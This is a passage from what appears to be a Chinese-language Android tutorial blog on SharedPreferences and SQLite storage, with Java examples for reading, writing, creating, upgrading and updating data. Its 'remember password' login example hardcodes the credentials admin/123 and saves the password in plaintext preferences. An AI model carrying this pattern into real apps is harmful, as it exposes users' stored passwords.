srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200926160850196"></p><p>主窗口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ublic <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button=(Button) findViewById(R.id.button_write);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                SharedPreferences.Editor editor=getSharedPreferences(<span class="string">&quot;data&quot;</span>,MODE_PRIVATE).edit();</span><br><span class="line">                editor.putString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;caixukun&quot;</span>);</span><br><span class="line">                editor.putInt(<span class="string">&quot;age&quot;</span>,<span class="number">56</span>);</span><br><span class="line">                editor.putBoolean(<span class="string">&quot;married&quot;</span>,<span class="keyword">false</span>);</span><br><span class="line">                editor.apply();</span><br><span class="line">                Intent intent=<span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>,msgActivity.class);</span><br><span class="line">                startActivity(intent);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消息窗口读数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">msgActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_msg);</span><br><span class="line">        TextView text_name=(TextView) findViewById(R.id.text_name);</span><br><span class="line">        TextView text_age=(TextView) findViewById(R.id.text_age);</span><br><span class="line">        TextView text_married=(TextView) findViewById(R.id.text_married);</span><br><span class="line">        SharedPreferences pref=getSharedPreferences(<span class="string">&quot;data&quot;</span>,MODE_PRIVATE);</span><br><span class="line">        String name=pref.getString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        String age=pref.getInt(<span class="string">&quot;age&quot;</span>,<span class="number">0</span>)+<span class="string">&quot;&quot;</span>;</span><br><span class="line">        String married=pref.getBoolean(<span class="string">&quot;married&quot;</span>,<span class="keyword">true</span>)+<span class="string">&quot;&quot;</span>;</span><br><span class="line">        Toast.makeText(msgActivity.<span class="keyword">this</span>,name+age,Toast.LENGTH_SHORT).show();</span><br><span class="line">        text_name.setText(name);</span><br><span class="line">        text_age.setText(age);</span><br><span class="line">        text_married.setText(married);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200926192433725.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200926192433725.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200926192433725"></p><p><strong>实现一个密码记住功能</strong></p><p>登录窗口源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">login</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SharedPreferences pref;</span><br><span class="line">    <span class="keyword">private</span> SharedPreferences.Editor editor;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(<span class="keyword">final</span> Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_login);</span><br><span class="line">        Button button=(Button) findViewById(R.id.button_1);</span><br><span class="line">        <span class="keyword">final</span> CheckBox checkBox=(CheckBox) findViewById(R.id.checkbox2);</span><br><span class="line">        <span class="keyword">final</span> EditText username=(EditText) findViewById(R.id.edit_id);</span><br><span class="line">        <span class="keyword">final</span> EditText password=(EditText) findViewById(R.id.edit_password);</span><br><span class="line">        <span class="comment">//这里使用的是Manager的一个静态方法</span></span><br><span class="line">        pref= PreferenceManager.getDefaultSharedPreferences(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isRemmber=pref.getBoolean(<span class="string">&quot;remember_password&quot;</span>,<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span>(isRemmber)&#123;</span><br><span class="line">            String name=pref.getString(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">            String pass=pref.getString(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">            password.setText(pass);</span><br><span class="line">            username.setText(name);</span><br><span class="line">            checkBox.setChecked(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String name=username.getText().toString();</span><br><span class="line">                String pass=password.getText().toString();</span><br><span class="line">                <span class="keyword">if</span>(name.equals(<span class="string">&quot;admin&quot;</span>)&amp;&amp;pass.equals(<span class="string">&quot;123&quot;</span>))&#123;</span><br><span class="line">                    <span class="comment">//添加数据需要获取一个edit( )方法</span></span><br><span class="line">                     editor=pref.edit();</span><br><span class="line">                     <span class="keyword">if</span>(checkBox.isChecked())&#123;</span><br><span class="line">                         editor.putBoolean(<span class="string">&quot;remember_password&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line">                         editor.putString(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">                         editor.putString(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">                     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                         editor.clear();</span><br><span class="line">                     &#125;</span><br><span class="line">                     editor.apply();</span><br><span class="line">                     Intent intent=<span class="keyword">new</span> Intent(login.<span class="keyword">this</span>,MainActivity.class);</span><br><span class="line">                    startActivity(intent);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    Toast.makeText(login.<span class="keyword">this</span>,<span class="string">&quot;密码账户错误&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200927141247481.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200927141247481.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200927141247481"></p><p>如果使用的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">editor.clear();</span><br></pre></td></tr></table></figure><p>会清除所有该数据表的内容，所以不能随便乱用</p><h2 id="使用SQLite语言"><a href="#使用SQLite语言" class="headerlink" title="使用SQLite语言"></a>使用SQLite语言</h2><p><em>了解SQLiteOpenHelper帮助类，以及两个实例方法，实例方法返回的是一个SQLiteDatabse对象，一般用帮助类进行一个建表以及更新表的操作，用SQLiteDatabase对象进行一个增删改查的操作</em></p><p><strong>创建数据库</strong></p><p>Android为了更加方便管理数据库，专门提供了一个SQLiteOpenHelper帮助类，借助这类可以非常简单对数据库进行创建和升级。</p><p>SQLiteOpenHelper是一个抽象类，使用的话肯定需要帮助类进行一个继承，SQLiteOpenHelper中有两个抽象方法，分别是onCreate( )和onUpgrade( )，这两个方法必须进行一个重写，然后在这两个方法中去实现创建以及升级数据库的逻辑。</p><p>该实例方法中还有两个非常重要的实例方法<code>getReadableDatabase( )</code>和<code>getWritableDatabase( )</code></p><p>这两个方法都可以创建或打开一个现有的数据库(如果数据已存在则直接打开，否则创建一个新的数据库)，并返回一个可对数据库进行读写操作的对象。不同的是，当数据库不可写入的时候：</p><p><code>getReadableDatabase( )</code>方法返回的对象将以读的方式打开数据库，</p><p><code>getWriteableDatabase( )</code>方法将出现异常。 </p><p>SQLiteOpenHelper中有两个构造方法可重写，一般使用参数少一点的构造方法，该构造方法接收4个参数，第一个参数是Context，第二个参数是数据库名，创建数据库时使用的就是这里指定的名称，第三个参数允许我们在查询数据的时候返回一个自定义的Cursor，一般传入null，第四个参数表示当前的数据库版本号，可用于对数据库进行升级操作。</p><p>构建出SQLiteOpenHelper的实例之后，再调用它的getReadableDatabase( )和getWriteableDatabase( )方法就能创建数据库。</p><p>创建后的数据库文件会放在/data/data/&lt;package name&gt;/databases目录下</p><p>SQLite的数据类型很简单，integer表示整型，real表示浮点型，text表示文本型，blob表示二进制型，primary key将id列为主键，并用autoincrement表示id列是自增长的</p><p><strong>创建数据库</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="class"><span class="keyword">class</span> <span class="title">MydatabaseHelper</span> <span class="keyword">extends</span> <span class="title">SQLiteOpenHelper</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CREATE_BOOK=<span class="string">&quot;create table Book (&quot;</span></span><br><span class="line">                + <span class="string">&quot;id integer primary key autoincrement,&quot;</span></span><br><span class="line">                +<span class="string">&quot;author text,&quot;</span></span><br><span class="line">                +<span class="string">&quot;price real,&quot;</span></span><br><span class="line">                +<span class="string">&quot;pages integer,&quot;</span></span><br><span class="line">                +<span class="string">&quot;name text)&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> Context mContext;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MydatabaseHelper</span><span class="params">(<span class="meta">@Nullable</span> Context context, <span class="meta">@Nullable</span> String name, <span class="meta">@Nullable</span> SQLiteDatabase.CursorFactory factory, <span class="keyword">int</span> version)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(context, name, factory, version);</span><br><span class="line">            mContext=context;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span> </span>&#123;</span><br><span class="line">            db.execSQL(CREATE_BOOK);</span><br><span class="line">            Toast.makeText(mContext,<span class="string">&quot;创建成功&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="keyword">int</span> oldVersion, <span class="keyword">int</span> newVersion)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> MydatabaseHelper dbhelper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"><span class="comment">//实例化该自动创建的对象</span></span><br><span class="line">        dbhelper=<span class="keyword">new</span> MydatabaseHelper(<span class="keyword">this</span>,<span class="string">&quot;BookStore&quot;</span>,<span class="keyword">null</span>,<span class="number">1</span>);</span><br><span class="line">        Button createDatabase=(Button) findViewById(R.id.button_re);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                dbhelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span> </span>&#123;</span><br><span class="line">          db.execSQL(CREATE_BOOK);</span><br><span class="line">          Toast.makeText(mContext,<span class="string">&quot;创建成功&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>主要建表语句，子啊onCreate( )方法中调用SQLiteDatabase的execSQL( )的方法去执行语句，并且弹出一个创建成功的语句</p><p>用DB browser查看</p><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929151059782.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929151059782.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929151059782"></p><p><strong>升级数据库(对数据库进行加表操作)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">final</span> String CREATE_CATEGORY=<span class="string">&quot;create table Category (&quot;</span></span><br><span class="line">        +<span class="string">&quot;id integer primary key autoincrement, &quot;</span></span><br><span class="line">        +<span class="string">&quot;category_name text, &quot;</span></span><br><span class="line">        +<span class="string">&quot;category_code integer)&quot;</span>;</span><br></pre></td></tr></table></figure><p>再增加一句SQL语句，增加第二个名为Category的表</p><p>如果直接再onCreate( )方法中使用此代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span> </span>&#123;</span><br><span class="line">    db.execSQL(CREATE_BOOK);</span><br><span class="line">    db.execSQL(CREATE_CATEGORY);</span><br><span class="line">    Toast.makeText(mContext,<span class="string">&quot;创建成功&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时是没有任何反应的，因为如果此时BookStore.db已经存再了，该语句已经不会再执行，此时只能在onUpgrade( )语句中再加入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="keyword">int</span> oldVersion, <span class="keyword">int</span> newVersion)</span> </span>&#123;</span><br><span class="line">    db.execSQL(<span class="string">&quot;drop table if exists Book&quot;</span>);</span><br><span class="line">    db.execSQL(<span class="string">&quot;drop table if exists Category&quot;</span>);</span><br><span class="line">    onCreate(db);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在onUpgrade( )语句中执行了两条DROP语句，如果发现数据库中已经存在Book表或者Category表，就把两张然后调用onCreate( )中的语句，进行一次重新建表的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> MydatabaseHelper dbhelper;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">    dbhelper=<span class="keyword">new</span> MydatabaseHelper(<span class="keyword">this</span>,<span class="string">&quot;BookStore&quot;</span>,<span class="keyword">null</span>,<span class="number">2</span>);</span><br><span class="line">    Button createDatabase=(Button) findViewById(R.id.button_re);</span><br><span class="line">    createDatabase.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            dbhelper.getWritableDatabase();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>关键语句应该在实例化的操作中将该构造函数的1改为2，只要比1大就能执行onUpgrade( )中的语句</p><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929152506589.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929152506589.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929152506589"></p><p><strong>对表进行CRUD操作</strong></p><h6 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h6><p>前面已经知道SQLiteOpenHelper的<code>getReadableDatabase( )</code>或<code>getWritableDatabase( )</code>方法是可以返回一个SQLiteDatabase( )对象，借助这个对象可以对数据进行各种操作。</p><p>SQLiteDatabase中提供了一个insert( )方法，这个方法专门用于添加数据，接收三个参数</p><p><code>db.insert(&quot;Book&quot;,null,values);</code></p><p>第一个参数是表名，第二个参数用于未指定添加数据的情况下给某些可为空的列自动赋值为NULL，一般传null，第三个是一个ContentValues对象，提供一系列的put( )方法重载，用于向ContentValues添加数据，只需要将表中的每个列名以及相应的待添加数据传入即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SQLiteDatabase db=dbhelper.getWritableDatabase();</span><br><span class="line">ContentValues values=<span class="keyword">new</span> ContentValues();</span><br><span class="line">values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;蔡徐坤的人生&quot;</span>);</span><br><span class="line">values.put(<span class="string">&quot;author&quot;</span>,<span class="string">&quot;caixukun&quot;</span>);</span><br><span class="line">values.put(<span class="string">&quot;pages&quot;</span>,<span class="number">444</span>);</span><br><span class="line">values.put(<span class="string">&quot;price&quot;</span>,<span class="number">17</span>);</span><br><span class="line">db.insert(<span class="string">&quot;Book&quot;</span>,<span class="keyword">null</span>,values);</span><br><span class="line">Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;添加数据成功&quot;</span>,Toast.LENGTH_SHORT).show();</span><br></pre></td></tr></table></figure><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929154643653.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929154643653.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929154643653"><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929154707204.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929154707204.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929154707204"></p><h6 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h6><p><code>db.update(&quot;Book&quot;,values,&quot;name=?&quot;,new String[]&#123;&quot;蔡徐坤的人生&quot;&#125;);</code></p><p>修改数据主要通过db.updata( )该方法进行操作，第一个参数是表名；第二个参数ContentValues对象，用put( )传入要修改的数据；第三个参数相当于SQL语句的WHERE,主要用来找列，该方法找的是name这列，问号相当于一个占位符，供给第四个参数使用；第四参数就是一个字符串 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mod_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db=dbhelper.getWritableDatabase();</span><br><span class="line">        ContentValues values=<span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(<span class="string">&quot;price&quot;</span>,<span class="number">10</span>);</span><br><span class="line">        db.update(<span class="string">&quot;Book&quot;</span>,values,<span class="string">&quot;name=?&quot;</span>,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;蔡徐坤的人生&quot;</span>&#125;);</span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;修改数据成功&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929160438852.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929160438852.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929160429032"><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929160447803.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929160447803.png" 